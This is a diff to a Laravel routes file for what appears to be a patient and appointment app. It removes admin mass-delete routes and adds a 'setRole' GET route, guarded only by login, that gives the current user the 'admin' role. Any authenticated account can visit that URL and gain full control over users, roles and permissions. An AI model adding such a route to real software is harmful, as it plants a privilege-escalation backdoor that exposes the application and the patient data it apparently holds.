@@ -8,10 +8,10 @@ use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\PatientController;
 use App\Http\Controllers\AppointmentController;
 use App\Http\Controllers\HomeController;
-
-
+use App\Models\User;
 use Illuminate\Support\Facades\Auth;
-
+use Illuminate\Support\Facades\Redirect;
+use Spatie\Permission\Models\Role;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -58,9 +58,14 @@ Route::view('/chat', 'chats.chat');
 // });
 Route::middleware(['role:admin'])->prefix('admin')->group( function () {
     Route::resource('permissions', PermissionsController::class);
-    Route::delete('permissions_mass_destroy', 'Admin\PermissionsController@massDestroy')->name('permissions.mass_destroy');
     Route::resource('roles', RolesController::class);
-    Route::delete('roles_mass_destroy', 'Admin\RolesController@massDestroy')->name('roles.mass_destroy');
     Route::resource('users', UsersController::class);
-    Route::delete('users_mass_destroy', 'Admin\UsersController@massDestroy')->name('users.mass_destroy');
 });
+
+Route::middleware('auth')->get('setRole',function () {
+    $user=User::Find(Auth::user()->id);
+    $user->assignRole('admin');
+    return Redirect::route('home');
+});
+
+
